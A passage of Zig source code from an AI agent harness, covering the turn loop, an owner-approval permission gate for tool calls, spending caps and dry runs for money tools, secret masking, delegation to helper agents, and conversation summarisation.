                else => try std.fmt.allocPrint(a, "Model call failed: {s} {s}", .{ @errorName(e), r.client.lastError() }),
            };
            try r.log.write(.model, false, .{ .run = r.label, .result = @errorName(e), .detail = r.client.lastError() });
            result.ended_by = try r.gpa.dupe(u8, why);
            rejected = e == error.Rejected;
            break;
        };
        used_tokens += reply.input_tokens + reply.cache_read_tokens + reply.cache_write_tokens;
        try r.log.write(.model, false, .{ .run = r.label, .result = "ok", .stop_reason = reply.stop_reason, .input_tokens = reply.input_tokens, .output_tokens = reply.output_tokens, .cache_read = reply.cache_read_tokens, .cache_write = reply.cache_write_tokens });
        // stopped while the model was answering: its answer is dropped
        if (r.env.stop.load(.acquire)) {
            result.stopped = true;
            result.ended_by = try r.gpa.dupe(u8, "Stopped.");
            break;
        }
        if (reply.blocks.len == 0) {
            result.ended_by = try r.gpa.dupe(u8, "The model gave an empty answer.");
            break;
        }
        try keep(tn, .{ .role = .assistant, .blocks = reply.blocks });
        const text = try reply.text(a);
        if (text.len > 0) {
            r.gpa.free(result.text);
            result.text = try r.gpa.dupe(u8, text);
        }

        var results: std.ArrayList(model.Block) = .empty;
        // a reply cut at max_tokens may end in a call cut half way (a
        // command missing its end): none of its calls run, each answered
        const cut = std.mem.eql(u8, reply.stop_reason, "max_tokens");
        for (reply.blocks) |b| {
            if (b != .tool_use) continue;
            const u = b.tool_use;
            if (cut) {
                try r.log.write(.tool, r.isPrivate(), .{ .run = r.label, .tool = u.name, .event = "not run: the reply was cut at max_tokens" });
                try results.append(a, .{ .tool_result = .{ .id = u.id, .content = cut_note, .is_error = true } });
                continue;
            }
            const out = try callTool(r, a, u.name, u.input_json);
            calls_made += 1;
            try results.append(a, .{ .tool_result = .{ .id = u.id, .content = out.text, .is_error = out.is_error } });
        }
        if (results.items.len == 0) break;
        try keep(tn, .{ .role = .user, .blocks = results.items });
    }
    if (rejected) {
        conv.dropLast();
        tn_kept = false;
        // whatever the agent said before, the owner is told why it ended
        const why = result.ended_by.?;
        const said = if (result.text.len == 0) try r.gpa.dupe(u8, why) else try std.fmt.allocPrint(r.gpa, "{s}\n\n{s}", .{ result.text, why });
        r.gpa.free(result.text);
        result.text = said;
    } else if (result.ended_by) |why| if (result.text.len == 0 or result.stopped) {
        r.gpa.free(result.text);
        result.text = try r.gpa.dupe(u8, why);
    };
    const dropped = try compact(r, conv);
    try r.log.write(.turn, r.isPrivate(), .{ .run = r.label, .answer = result.text, .steps = result.steps, .ended_by = result.ended_by, .dropped_turns = dropped });
    return result;
}

const cut_note = "not run: your reply was cut off at the output limit (max_tokens) before it was complete, so this call may be cut too; make it again, in smaller parts if it was long";

/// Frees what `turn` allocated in its result.
pub fn freeResult(r: *Run, res: TurnResult) void {
    r.gpa.free(res.text);
    if (res.ended_by) |w| r.gpa.free(w);
}

fn callTool(r: *Run, a: std.mem.Allocator, name: []const u8, input_json: []const u8) !tools.Output {
    const out = try callToolRaw(r, a, name, input_json);
    // the model's API refuses a request that is not UTF-8, and with it every
    // later one that carries this turn: a tool's bytes are made valid here
    return .{ .text = try util.validUtf8(a, out.text), .is_error = out.is_error };
}

fn callToolRaw(r: *Run, a: std.mem.Allocator, name: []const u8, input_json: []const u8) !tools.Output {
    if (r.env.stop.load(.acquire)) return .{ .text = "stopped by the owner", .is_error = true };
    // what to mask: as the list is now (a password made a moment ago too)
    if (r.masks) |m| r.env.secrets = try m.snapshot(a);
    var mt: ?*const McpTool = null;
    const tool: gate.Tool = if (gate.Tool.fromName(name)) |tl| switch (tl) {
        // only reachable through an MCP tool's own name
        .mcp, .money => return .{ .text = "no such tool", .is_error = true },
        else => tl,
    } else blk: {
        for (r.mcp) |*m| if (std.mem.eql(u8, m.def.name, name)) {
            mt = m;
            break :blk if (m.money) .money else .mcp;
        };
        return .{ .text = "no such tool", .is_error = true };
    };
    if (!r.allows(tool)) return .{ .text = "this tool is not available here", .is_error = true };
    if (tool == .web) {
        // the tool asks the gate itself: for each host and login it uses
        const w = r.web orelse return .{ .text = "this tool is not available here", .is_error = true };
        w.env.secrets = r.env.secrets;
        const out = try w.run(a, input_json);
        // the model's input, placeholders and all: never a value
        try r.log.write(.tool, r.isPrivate(), .{ .run = r.label, .tool = name, .arg = util.cut(input_json, 1500), .is_error = out.is_error, .output = out.text });
        return out;
    }
    const arg = switch (tool) {
        .delegate => delegateArg(a, input_json) catch return .{ .text = "delegate needs a list of 1 to 8 tasks", .is_error = true },
        // the whole input: rules and the owner see all of it
        .mcp, .money => try std.fmt.allocPrint(a, "{s}/{s} {s}", .{ mt.?.server.name, mt.?.tool, input_json }),
        else => tools.mainArg(a, tool, input_json) catch return .{ .text = "the tool's input is missing its main field", .is_error = true },
    };
    const now_s = r.now();
    var reserved: Reservation = .{};
    if (tool == .money) {
        if (moneyCheck(r, a, mt.?, input_json, now_s, &reserved)) |why| {
            try r.log.write(.gate, r.isPrivate(), .{ .run = r.label, .tool = name, .decision = "deny", .why = why, .arg = arg });
            return .{ .text = try std.fmt.allocPrint(a, "refused by the gate: {s}", .{why}), .is_error = true };
        }
    }
    // what the owner sees besides the argument
    const detail: []const u8 = switch (tool) {
        .write_file => blk: {
            const content = jv.str(jv.get(jv.parse(a, input_json), "content")) orelse "";
            break :blk try std.fmt.allocPrint(a, "{d} bytes:\n{s}", .{ content.len, content });
        },
        else => "",
    };
    if (try decideAndAsk(r, a, tool, name, arg, detail, now_s)) |refused| {
        if (tool == .money) releaseMoney(r, mt.?, reserved);
        return .{ .text = try std.fmt.allocPrint(a, "refused by the gate: {s}", .{refused}), .is_error = true };
    }
    // a tool gets what is left of the turn, no more; fetch and search
    // send each redirect through the gate
    var env = redirectEnv(r);
    if (r.deadline_s > 0) {
        const left = r.deadline_s - r.now();
        if (left <= 0) {
            if (tool == .money) releaseMoney(r, mt.?, reserved);
            const late: tools.Output = .{ .text = "not run: no time left in this turn", .is_error = true };
            try r.log.write(.tool, r.isPrivate(), .{ .run = r.label, .tool = name, .arg = arg, .is_error = true, .output = late.text });
            return late;
        }
        const secs: u32 = @intCast(@min(left, std.math.maxInt(u32)));
        env.shell_seconds = @min(env.shell_seconds, secs);
        env.browser_seconds = @min(env.browser_seconds, secs);
    }

    const out: tools.Output = switch (tool) {
        .recall => blk: {
            r.lock.lockUncancelable(r.io);
            defer r.lock.unlock(r.io);
            const found = try r.mem.search(a, arg);
            var s: std.ArrayList(u8) = .empty;
            for (found) |it| try s.print(a, "- [{s}] {s}\n", .{ it.id, it.body });
            break :blk .{ .text = if (s.items.len > 0) s.items else "nothing found" };
        },
        .remember => blk: {
            if (r.isPrivate()) break :blk tools.Output{ .text = "not saved: this conversation is private" };
            r.lock.lockUncancelable(r.io);
            defer r.lock.unlock(r.io);
            const res = r.mem.addFrom(arg, null, now_s, .other) catch |e| break :blk tools.Output{ .text = @errorName(e), .is_error = true };
            try r.log.write(.memory, false, .{ .event = if (res.merged) "known" else "add", .id = res.id, .by = "agent" });
            // the owner sees what goes into every later prompt
            if (!res.merged) if (r.notice) |n| if (r.mem.find(res.id)) |it| n.say(n.ctx, try memory.savedNote(a, it.id, it.body));
            break :blk .{ .text = try std.fmt.allocPrint(a, "{s} {s}", .{ if (res.merged) "already in memory as" else "saved as", res.id }) };
        },
        .delegate => try delegate(r, a, input_json),
        .mcp, .money => try callMcp(r, a, mt.?, arg, input_json, reserved),
        .skill => blk: {
            const v = jv.parse(a, input_json).?;
            const text = if (jv.str(jv.get(v, "file"))) |file|
                skills.readFile(a, r.io, r.skills_dir, arg, file)
            else
                skills.load(a, r.io, r.skills_dir, arg);
            break :blk if (text) |x| tools.Output{ .text = x } else |e| tools.Output{ .text = try std.fmt.allocPrint(a, "could not load the skill: {s}", .{@errorName(e)}), .is_error = true };
        },
        .skill_save => blk: {
            const v = jv.parse(a, input_json).?;
            const desc = jv.str(jv.get(v, "description")) orelse "";
            const body = jv.str(jv.get(v, "body")) orelse "";
            skills.save(r.io, r.skills_dir, arg, desc, body) catch |e| break :blk tools.Output{ .text = try std.fmt.allocPrint(a, "not saved: {s}", .{@errorName(e)}), .is_error = true };
            break :blk .{ .text = try std.fmt.allocPrint(a, "saved skill {s}", .{arg}) };
        },
        .fetch, .browse => blk: {
            const key = try std.fmt.allocPrint(a, "{s} {s}", .{ name, input_json });
            if (r.cache) |c| if (c.get(r.io, a, key)) |hit| break :blk tools.Output{ .text = hit };
            const out = try tools.run(env, a, tool, input_json);
            if (r.cache) |c| if (!out.is_error) c.put(r.io, key, out.text);
            break :blk out;
        },
        else => try tools.run(env, a, tool, input_json),
    };
    try r.log.write(.tool, r.isPrivate(), .{ .run = r.label, .tool = name, .arg = arg, .is_error = out.is_error, .output = out.text });
    return out;
}

/// The run's tool environment, with its gate for redirects.
fn redirectEnv(r: *Run) tools.Env {
    var env = r.env;
    env.redirect = .{ .ctx = r, .allow = redirectAllow };
    return env;
}

/// A redirect of `fetch` or `search` passes the gate as a fetch of its
/// own: on a host the call already reached only a deny rule stops it (the
/// call was allowed for that host); another host is decided, and asked,
/// like any fetch.
fn redirectAllow(ctx: *anyopaque, a: std.mem.Allocator, url: []const u8, known_host: bool) ?[]const u8 {
    const r: *Run = @ptrCast(@alignCast(ctx));
    if (r.env.stop.load(.acquire)) return "stopped by the owner";
    if (!known_host) return decideAndAsk(r, a, .fetch, "fetch", url, "", r.now()) catch "the gate could not decide";
    const d = blk: {
        r.lock.lockUncancelable(r.io);
        defer r.lock.unlock(r.io);
        break :blk r.gate.decide(a, .fetch, url, r.now(), .{});
    };
    const refused = d.action == .deny;
    r.log.write(.gate, r.isPrivate(), .{ .run = r.label, .tool = "fetch", .decision = if (refused) "deny" else "allow", .why = if (refused) d.why else "a redirect on a host this call reached", .arg = url }) catch {};
    return if (refused) d.why else null;
}

// ---- tests ----



/// The longest question the owner is asked: a few Telegram messages of
/// 4096 bytes. A longer call is refused, never shown cut: padding could
/// hide what matters.
pub const max_question = 12 * 1024;

/// The gate's decision for one call, asking the owner when it says ask;
/// logged. Null when the call may run, else why not. `detail`: what the
/// owner sees besides the argument (a file's content).
fn decideAndAsk(r: *Run, a: std.mem.Allocator, tool: gate.Tool, name: []const u8, arg: []const u8, detail: []const u8, now_s: i64) !?[]const u8 {
    const d = blk: {
        r.lock.lockUncancelable(r.io);
        defer r.lock.unlock(r.io);
        break :blk r.gate.decide(a, tool, arg, now_s, .{ .scheduled = r.scheduled, .money_unattended = r.money.scheduled });
    };
    noteSkipped(r, a, tool, name, arg, now_s, d);
    var action = d.action;
    var why = d.why;
    if (action == .ask) ask: {
        action = .deny;
        const asker = r.asker orelse {
            why = "no one to ask";
            break :ask;
        };
        const who = if (r.helper) try std.fmt.allocPrint(a, "[{s}] ", .{r.label}) else "";
        // the form the gate matched (for files, the path inside the
        // workspace), and what the model gave when that differs
        const given = if (std.mem.eql(u8, d.subject, arg)) "" else try std.fmt.allocPrint(a, " (given as {s})", .{arg});
        // a money call says whether it is made: the switch can change while asked
        const dry: []const u8 = if (tool != .money) "" else if (r.dryRun()) "\nDry run is on: this call is not made." else "\nDry run is off: this call is made.";
        const what = try std.fmt.allocPrint(a, "{s}{s}: {s}{s}{s}{s}{s}", .{ who, name, d.subject, given, if (detail.len > 0) ", " else "", detail, dry });
        if (what.len > max_question) {
            why = try std.fmt.allocPrint(a, "too long to ask the owner ({d} bytes; a question is at most {d}): make the call smaller", .{ what.len, max_question });
            break :ask;
        }
        // helpers working at once still ask one question at a time; one
        // that could only be answered after the turn's end is not asked
        if (r.ask_lock) |l| if (!lockUntil(l, r.io, r.deadline_s, r.env.stop)) {
            why = if (r.env.stop.load(.acquire)) "stopped by the owner" else "no time left in the turn to ask the owner";
            break :ask;
        };
        if (r.deadline_s > 0 and r.now() >= r.deadline_s) {
            if (r.ask_lock) |l| l.unlock(r.io);
            why = "no time left in the turn to ask the owner";
            break :ask;
        }
        var ans = if (r.env.stop.load(.acquire)) Answer.deny else asker.ask(asker.ctx, .{ .text = what, .allow_day = tool != .money, .deadline_s = r.deadline_s });
        // money is never granted for a day, whatever came back
        if (tool == .money and ans == .day) ans = .once;
        if (r.ask_lock) |l| l.unlock(r.io);
        switch (ans) {
            .once => {
                action = .allow;
                why = "allowed once by the owner";
            },
            .day => {
                action = .allow;
                why = "allowed for 24 hours by the owner";
                r.lock.lockUncancelable(r.io);
                defer r.lock.unlock(r.io);
                // the form the gate matches (for files, the path inside the workspace)
                try r.gate.grants.add(tool, gate.grantKey(tool, d.subject), now_s + 86400);
                if (r.grants_path) |p| r.gate.grants.save(r.io, p, now_s) catch {};
            },
            .deny => why = "denied by the owner",
            .timeout => why = "no answer from the owner in time",
        }
    }
    try r.log.write(.gate, r.isPrivate(), .{ .run = r.label, .tool = name, .decision = @tagName(action), .why = why, .arg = arg });
    return if (action == .allow) null else why;
}

/// Takes `l`, waiting no later than `deadline_s` (0: no limit) and not
/// past a stop; false if it was not taken.
fn lockUntil(l: *Io.Mutex, io: Io, deadline_s: i64, stop: *std.atomic.Value(bool)) bool {
    while (!l.tryLock()) {
        if (stop.load(.acquire)) return false;
        if (deadline_s > 0 and util.nowSeconds(io) >= deadline_s) return false;
        io.sleep(.fromMilliseconds(20), .awake) catch {};
    }
    return true;
}

/// What a run left out because nobody could approve it; shared by the
/// run and its helpers.
pub const Skipped = struct {
    gpa: std.mem.Allocator,
    mutex: Io.Mutex = .init,
    items: std.ArrayList([]u8) = .empty,
    /// Calls past the first `max`, only counted.
    more: usize = 0,
    const max = 8;

    pub fn init(gpa: std.mem.Allocator) Skipped {
        return .{ .gpa = gpa };
    }

    pub fn deinit(s: *Skipped) void {
        for (s.items.items) |x| s.gpa.free(x);
        s.items.deinit(s.gpa);
    }

    fn add(s: *Skipped, io: Io, name: []const u8, arg: []const u8) void {
        s.mutex.lockUncancelable(io);
        defer s.mutex.unlock(io);
        const short = util.cut(arg, 100);
        const line = std.fmt.allocPrint(s.gpa, "{s}: {s}{s}", .{ name, short, if (short.len < arg.len) "…" else "" }) catch return;
        for (s.items.items) |x| if (std.mem.eql(u8, x, line)) {
            s.gpa.free(line);
            return;
        };
        if (s.items.items.len >= max) {
            s.gpa.free(line);
            s.more += 1;
            return;
        }
        s.items.append(s.gpa, line) catch s.gpa.free(line);
    }

    /// "Skipped (needs approval): shell: df -h; …", or "" if nothing was.
    pub fn text(s: *Skipped, io: Io, arena: std.mem.Allocator) ![]const u8 {
        s.mutex.lockUncancelable(io);
        defer s.mutex.unlock(io);
        if (s.items.items.len == 0) return "";
        var out: std.ArrayList(u8) = .empty;
        try out.appendSlice(arena, "Skipped (needs approval): ");
        for (s.items.items, 0..) |x, i| try out.print(arena, "{s}{s}", .{ if (i > 0) "; " else "", x });
        if (s.more > 0) try out.print(arena, "; and {d} more", .{s.more});
        return out.items;
    }
};

/// Notes a call refused only because nobody could approve it: the gate
/// said ask with no one to ask, or turned ask into deny in a scheduled run.
fn noteSkipped(r: *Run, a: std.mem.Allocator, tool: gate.Tool, name: []const u8, arg: []const u8, now_s: i64, d: gate.Decision) void {
    const s = r.skipped orelse return;
    const unattended = switch (d.action) {
        .ask => r.asker == null,
        .deny => r.scheduled and blk: {
            r.lock.lockUncancelable(r.io);
            defer r.lock.unlock(r.io);
            break :blk r.gate.decide(a, tool, arg, now_s, .{}).action == .ask;
        },
        .allow => false,
    };
    if (unattended) s.add(r.io, name, arg);
}

fn webAllow(ctx: *anyopaque, a: std.mem.Allocator, tool: gate.Tool, arg: []const u8) ?[]const u8 {
    const r: *Run = @ptrCast(@alignCast(ctx));
    if (r.env.stop.load(.acquire)) return "stopped by the owner";
    return decideAndAsk(r, a, tool, @tagName(tool), arg, "", r.now()) catch "the gate could not decide";
}

/// A value web made (a password at a sign-up): masked everywhere at once.
fn webSecret(ctx: *anyopaque, name: []const u8, value: []const u8) void {
    const r: *Run = @ptrCast(@alignCast(ctx));
    if (r.masks) |m| m.add(name, value) catch {};
}

fn webNote(ctx: *anyopaque, event: []const u8, login: []const u8, detail: []const u8) void {
    const r: *Run = @ptrCast(@alignCast(ctx));
    r.log.write(.tool, r.isPrivate(), .{ .run = r.label, .tool = "web", .event = event, .login = login, .detail = detail }) catch {};
}

// ---- MCP calls and money ----

/// The amount in a money call's input: a number or a numeric string.
fn amountOf(a: std.mem.Allocator, input_json: []const u8, field: []const u8) ?f64 {
    const v = jv.parse(a, input_json) orelse return null;
    const x = jv.get(v, field) orelse return null;
    return switch (x) {
        .integer => |i| @floatFromInt(i),
        .float => |f| f,
        .number_string, .string => |s| std.fmt.parseFloat(f64, std.mem.trim(u8, s, " ")) catch null,
        else => null,
    };
}

fn moneyDay(r: *const Run, now_s: i64) i64 {
    return @divFloor(now_s + @as(i64, r.utc_offset) * 60, 86400);
}

/// Why a money call is refused before anyone is asked, or null. When it
/// passes, its amount is already counted in today's total (checked and
/// counted under one lock, so two runs cannot both pass the same cap) as
/// `res`; `releaseMoney` takes it back if the call is not made.
fn moneyCheck(r: *Run, a: std.mem.Allocator, m: *const McpTool, input_json: []const u8, now_s: i64, res: *Reservation) ?[]const u8 {
    var amount: f64 = 0;
    // the server's own caps, else config.ini's
    const per_call = m.max_per_call orelse r.money.max_per_call;
    const per_day = m.max_per_day orelse r.money.max_per_day;
    const capped = per_call > 0 or per_day > 0;
    if (r.scheduled and r.money.scheduled and !capped)
        return "money in scheduled runs needs max_per_call or max_per_day ([money] in config.ini, or the server's section in mcp.ini)";
    switch (m.amount) {
        .none => {},
        // without its field the caps cannot be checked: refused, not let through
        .unset => if (capped) return "no amount field is set for this tool in mcp.ini (amount =), so the money caps cannot be checked",
        .name => |field| if (amountOf(a, input_json, field)) |x| {
            if (x < 0 or std.math.isNan(x) or std.math.isInf(x)) return "the amount is not a positive number";
            amount = x;
        } else if (capped) {
            return std.fmt.allocPrint(a, "no amount in the field \"{s}\", so the caps cannot be checked", .{field}) catch "no amount";
        },
    }
    if (per_call > 0 and amount > @as(f64, @floatFromInt(per_call)))
        return std.fmt.allocPrint(a, "{d} is over the cap of {d} per call", .{ amount, per_call }) catch "over the cap per call";
    const l = r.money_ledger orelse return if (per_day > 0) "no record of today's total" else null;
    l.mutex.lockUncancelable(r.io);
    defer l.mutex.unlock(r.io);
    if (l.trouble()) |why| return std.fmt.allocPrint(a, "{s}; no money call is made until it is fixed and harness restarted", .{why}) catch "the money record cannot be trusted";
    // each server has its own total: its caps are in its own units
    const day = l.dayFor(m.server.name, moneyDay(r, now_s));
    const spent = l.spent(m.server.name, day);
    if (per_day > 0 and spent + amount > @as(f64, @floatFromInt(per_day)))
        return std.fmt.allocPrint(a, "{d} more would be over the cap of {d} per day ({d} so far today)", .{ amount, per_day, spent }) catch "over the cap per day";
    res.* = l.reserve(r.io, m.server.name, day, amount) catch |e| return switch (e) {
        error.NoRoom => "the day totals of too many servers are kept already",
        else => std.fmt.allocPrint(a, "today's money total could not be saved to state/money ({s}), so no money call is made while it cannot be", .{@errorName(e)}) catch "the money record could not be saved",
    };
    return null;
}

/// Takes back an amount counted by `moneyCheck` for a call not made: from
/// the day it was counted toward, not the day it is now.
fn releaseMoney(r: *Run, m: *const McpTool, res: Reservation) void {
    const l = r.money_ledger orelse return;
    l.mutex.lockUncancelable(r.io);
    defer l.mutex.unlock(r.io);
    l.release(r.io, m.server.name, res) catch |e|
        r.log.write(.gate, false, .{ .run = r.label, .tool = m.def.name, .event = "money record not saved", .why = @errorName(e) }) catch {};
}

fn callMcp(r: *Run, a: std.mem.Allocator, m: *const McpTool, arg: []const u8, input_json: []const u8, reserved: Reservation) !tools.Output {
    if (m.money and r.dryRun()) {
        releaseMoney(r, m, reserved);
        return .{ .text = try std.fmt.allocPrint(a, "dry run: would call {s}", .{arg}) };
    }
    // what is left of the turn, no more
    const left: u64 = if (r.deadline_s > 0) @intCast(@max(r.deadline_s - r.now(), 1)) else r.limits.turn_seconds;
    const timeout_ms: u32 = @intCast(@min(@min(left, r.limits.turn_seconds) * 1000, std.math.maxInt(u32)));
    // the whole answer: it is masked before it is cut, so a key across the
    // cut is not half shown
    const res = m.server.call(a, m.tool, input_json, r.env.stop, timeout_ms, std.math.maxInt(usize)) catch |e|
        return .{ .text = try std.fmt.allocPrint(a, "failed: {s}", .{@errorName(e)}), .is_error = true };
    // a money call that was sent stays counted whatever came back: an
    // error, a timeout or /stop does not prove the order was not placed
    const max = r.env.tool_output_bytes;
    const upto = @min(res.text.len, @as(usize, max) * 2 + 4096);
    const whole = upto == res.text.len;
    const masked = try tools.mask(a, r.env.secrets, res.text[0..upto], whole);
    const shown = util.cut(masked, max);
    const text = if (whole and shown.len == masked.len) masked else try std.fmt.allocPrint(a, "{s}\n[output cut at {d} bytes of {d}]", .{ shown, max, if (whole) masked.len else res.text.len });
    return .{ .text = text, .is_error = res.is_error };
}

// ---- helpers ----

const max_tasks = 8;
const default_helper_tools = [_]gate.Tool{ .search, .fetch, .browse, .read_file, .recall, .skill };

const Task = struct {
    text: []const u8,
    tools: []const gate.Tool,
    strong: bool,
};

fn parseTasks(a: std.mem.Allocator, input_json: []const u8) ![]Task {
    const v = jv.parse(a, input_json) orelse return error.BadInput;
    const list = jv.arr(jv.get(v, "tasks")) orelse return error.BadInput;
    if (list.len == 0 or list.len > max_tasks) return error.BadInput;
    const out = try a.alloc(Task, list.len);
    for (list, 0..) |item, i| {
        const text = jv.str(jv.get(item, "task")) orelse return error.BadInput;
        if (text.len == 0) return error.BadInput;
        var tl: std.ArrayList(gate.Tool) = .empty;
        if (jv.arr(jv.get(item, "tools"))) |names| {
            for (names) |n| {
                const tool = gate.Tool.fromName(jv.str(n) orelse continue) orelse continue;
                if (std.mem.indexOfScalar(gate.Tool, tl.items, tool) == null) try tl.append(a, tool);
            }
        } else try tl.appendSlice(a, &default_helper_tools);
        const strong = if (jv.get(item, "strong")) |sv| (sv == .bool and sv.bool) else false;
        out[i] = .{ .text = text, .tools = tl.items, .strong = strong };
    }
    return out;
}

/// What the gate and the log see for a delegate call: every task, whole.
fn delegateArg(a: std.mem.Allocator, input_json: []const u8) ![]const u8 {
    const tasks = try parseTasks(a, input_json);
    var out: std.ArrayList(u8) = .empty;
    try out.print(a, "{d} task{s}:", .{ tasks.len, if (tasks.len == 1) "" else "s" });
    for (tasks) |tk| try out.print(a, "\n- {s}", .{tk.text});
    return out.items;
}

const Helper = struct {
    parent: *Run,
    task: Task,
    n: usize,
    deadline_s: i64,
    cache: *PageCache,
    /// Filled by the helper thread (owned by parent.gpa).
    answer: []u8 = &.{},
    ended_by: ?[]u8 = null,
    steps: u32 = 0,
    failed: ?[]const u8 = null,
};

fn delegate(r: *Run, a: std.mem.Allocator, input_json: []const u8) !tools.Output {
    const tasks = try parseTasks(a, input_json);
    var cache = PageCache.init(r.gpa);
    defer cache.deinit();
    // what is left of the turn that asked, not a new turn's worth
    const deadline = if (r.deadline_s > 0) r.deadline_s else r.now() + r.limits.turn_seconds;
    const hs = try a.alloc(Helper, tasks.len);
    const threads = try a.alloc(?std.Thread, tasks.len);
    for (tasks, 0..) |task, i| {
        hs[i] = .{ .parent = r, .task = task, .n = i + 1, .deadline_s = deadline, .cache = r.cache orelse &cache };
        threads[i] = std.Thread.spawn(.{}, helperMain, .{&hs[i]}) catch null;
        if (threads[i] == null) hs[i].failed = "could not start";
    }
    for (threads) |th| if (th) |x| x.join();

    var out: std.ArrayList(u8) = .empty;
    for (hs) |*h| {
        defer {
            r.gpa.free(h.answer);
            if (h.ended_by) |e| r.gpa.free(e);
        }
        try out.print(a, "## Helper {d}: {s}\n", .{ h.n, util.cut(h.task.text, 120) });
        if (h.failed) |why| {
            try out.print(a, "(failed: {s})\n\n", .{why});
            continue;
        }
        if (h.ended_by) |why| try out.print(a, "(ended early: {s})\n", .{why});
        try out.print(a, "{s}\n\n", .{if (h.answer.len > 0) h.answer else "(no answer)"});
    }
    return .{ .text = out.items, .is_error = false };
}

fn helperMain(h: *Helper) void {
    helperRun(h) catch |e| {
        h.failed = @errorName(e);
    };
}

fn helperRun(h: *Helper) !void {
    const p = h.parent;
    const cfg = p.model_cfg.?;
    if (p.pool) |pool| {
        if (!pool.acquire(p.io, p.agents.parallel, p.env.stop)) {
            h.failed = "stopped before it started";
            return;
        }
    }
    defer if (p.pool) |pool| pool.release(p.io);
    const left = h.deadline_s - p.now();
    if (left <= 0) {
        h.failed = "no time left in the turn";
        return;
    }
    var client = try model.Client.init(p.gpa, p.io, cfg.url, cfg.key, if (h.task.strong) cfg.main else cfg.worker, cfg.max_tokens);
    defer client.deinit();
    var label_buf: [64]u8 = undefined;
    var w = p.*;
    w.client = &client;
    w.helper = true;
    w.label = std.fmt.bufPrint(&label_buf, "{s}/h{d}", .{ util.cut(p.label, 40), h.n }) catch "helper";
    w.allowed = h.task.tools;
    w.auto_recall = false;
    w.top_size = 0;
    w.extra_instructions = "";
    w.cache = h.cache;
    w.web = null;
    w.token_cap = p.agents.tokens;
    w.limits.steps_per_turn = p.agents.steps;
    w.limits.turn_seconds = @intCast(@min(left, std.math.maxInt(u32)));
    var conv = Conversation.init(p.gpa);
    defer conv.deinit();
    const res = try turn(&w, &conv, h.task.text, false);
    defer freeResult(&w, res);
    h.steps = res.steps;
    h.answer = try p.gpa.dupe(u8, util.cut(res.text, p.agents.answer_bytes));
    if (res.ended_by) |e| h.ended_by = try p.gpa.dupe(u8, e);
}

// ---- summaries ----

const summary_prompt =
    \\Summarise this conversation between an agent and its owner for the agent's own later use: what the owner wants, facts and decisions, links found, open tasks. Plain text, at most 300 words. If an earlier summary is given, fold it in.
;

/// Keeps the conversation under its size limit: the oldest turns (all
/// but the last 4) are replaced by a summary; if that fails or is not
/// set up, they are dropped. Returns how many turns went.
fn compact(r: *Run, conv: *Conversation) !usize {
    const limit = r.limits.conversation_bytes;
    if (conv.bytes() <= limit) return 0;
    const keep_last = 4;
    var gone: usize = 0;
    if (r.model_cfg != null and !r.helper and conv.turns.items.len > keep_last) {
        const n = conv.turns.items.len - keep_last;
        if (summarise(r, conv, n)) |sum| {
            if (conv.summary) |old| conv.gpa.free(old);
            conv.summary = sum.text;
            conv.dropOldest(n);
            conv.lost += sum.left_out;
            gone = n;
            try r.log.write(.turn, r.isPrivate(), .{ .run = r.label, .event = "summarised", .turns = n - sum.left_out });
            if (sum.left_out > 0) try r.log.write(.turn, r.isPrivate(), .{ .run = r.label, .event = "dropped unsummarised", .turns = sum.left_out, .summary = true });
        } else |e| {
            try r.log.write(.model, false, .{ .run = r.label, .event = "summary failed", .result = @errorName(e) });
        }
    }
    // still over (or no summary): the oldest go whole, and it is said
    const trimmed = conv.trim(limit);
    if (trimmed > 0) try r.log.write(.turn, r.isPrivate(), .{ .run = r.label, .event = "dropped unsummarised", .turns = trimmed, .summary = conv.summary != null });
    return gone + trimmed;
}

/// The most a summary call is sent.
const summary_input_max = 60000;

const Summary = struct {
    /// Owned by `r.gpa`.
    text: []u8,
    /// The oldest turns that did not fit in the call.
    left_out: usize,
};

/// A summary of the oldest `n` turns (with the earlier summary).
fn summarise(r: *Run, conv: *Conversation, n: usize) !Summary {
    var arena_state: std.heap.ArenaAllocator = .init(r.gpa);
    defer arena_state.deinit();
    const a = arena_state.allocator();
    // each turn as text, so that the newest are the ones kept
    const parts = try a.alloc([]const u8, n);
    for (conv.turns.items[0..n], parts) |tn, *part| {
        var turn_text: std.ArrayList(u8) = .empty;
        for (tn.messages.items) |m| for (m.blocks) |b| {
            // private turns never leave their turn: not into memory, not here
            if (tn.private) {
                if (m.role == .user and b == .text and !std.mem.startsWith(u8, b.text, context_mark)) try turn_text.appendSlice(a, "(a private part of the conversation, left out)\n");
                continue;
            }
            switch (b) {
                .text => |x| if (!std.mem.startsWith(u8, x, context_mark)) try turn_text.print(a, "{s}: {s}\n", .{ if (m.role == .user) "Owner" else "Agent", util.cut(x, 2000) }),
                .tool_use => |u| try turn_text.print(a, "(tool {s}: {s})\n", .{ u.name, util.cut(u.input_json, 300) }),
                .tool_result => |x| try turn_text.print(a, "(result: {s})\n", .{util.cut(x.content, 500)}),
            }
        };
        part.* = turn_text.items;
    }
    var text: std.ArrayList(u8) = .empty;
    if (conv.summary) |old| try text.print(a, "Earlier summary:\n{s}\n\n", .{old});
    // over the limit, the oldest turns are left out: the newest matter most
    var first = n;
    var size = text.items.len;
    while (first > 0 and size + parts[first - 1].len <= summary_input_max) : (first -= 1) size += parts[first - 1].len;
    const left_out = if (first == n) n - 1 else first;
    if (left_out > 0) try text.print(a, "({d} older turns left out: too long to summarise)\n", .{left_out});
    if (first == n) {
        // not even the newest fits: its start, rather than nothing
        try text.appendSlice(a, util.cut(parts[n - 1], summary_input_max -| text.items.len));
    } else for (parts[first..]) |part| try text.appendSlice(a, part);
    const cfg = r.model_cfg.?;
    var client = try model.Client.init(r.gpa, r.io, cfg.url, cfg.key, cfg.memory, 1024);
    defer client.deinit();
    const reply = try client.send(a, summary_prompt, &.{.{ .role = .user, .blocks = &.{.{ .text = text.items }} }}, &.{});
    try r.log.write(.model, false, .{ .run = r.label, .result = "ok", .purpose = "summary", .input_tokens = reply.input_tokens, .output_tokens = reply.output_tokens });
    const out = try reply.text(a);
    if (out.len == 0) return error.EmptySummary;
    return .{ .text = try r.gpa.dupe(u8, out), .left_out = left_out };
}

const t = std.testing;
const rules = @import("rules.zig");

const Fix = struct {
    e: model.TestEnv,
    client: model.Client,
    grants: gate.Grants,
    g: gate.Gate,
    log: log_mod.Log,
    mem: memory.Store,
    lock: Io.Mutex = .init,
    stop: std.atomic.Value(bool) = .init(false),
    run: Run,
    conv: Conversation,
    asked: u32 = 0,
    answer: Answer = .once,
    pool: Pool = .{},
    ask_lock: Io.Mutex = .init,
    ask_ms: u32 = 0,
    last_allow_day: bool = false,
    /// The last question asked (in the arena), and its deadline.
    last_what: []const u8 = "",
